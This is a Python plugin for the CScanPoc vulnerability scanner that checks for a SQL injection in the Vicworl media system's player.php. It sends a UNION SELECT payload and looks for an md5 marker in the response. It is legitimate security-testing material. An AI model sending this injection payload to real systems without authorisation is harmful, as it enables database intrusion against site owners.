# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Vicworl_0003' # 平台漏洞编号，留空
    name = 'Vicworl媒体系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-04-03'  # 漏洞公布时间
    desc = '''
        Vicworl媒体系统 /player.php?id=-3538 SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'Vicworl'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '1c3aadf6-2511-4684-aad5-8650b12a2f83'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #No.1 http://www.wooyun.org/bugs/wooyun-2010-078346
            payload = "/player.php?id=-3538%20UNION%20ALL%20SELECT%20md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1),md5(1)%20--%20"
            target = self.target + payload
            #code, head, body, errcode, final_url = curl.curl2(target);
            r = requests.get(target)

            if 'c4ca4238a0b923820dcc509a6f75849' in r.content:
                #security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
